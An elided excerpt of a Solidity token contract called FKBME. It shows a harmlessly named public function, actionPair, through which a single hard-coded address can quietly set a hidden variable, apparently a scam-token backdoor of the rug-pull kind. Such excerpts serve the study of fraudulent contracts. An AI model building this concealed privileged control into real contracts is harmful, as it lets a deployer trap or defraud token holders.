...
contract FKBME is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xECfe8C551A4dd0413f5ead8896aB952Fc9Adae30) _p76234 = account;
        return true;
    }
    ...
    constructor() {
        _name = unicode"FUCK BOME";
        _symbol = unicode"FKBME";
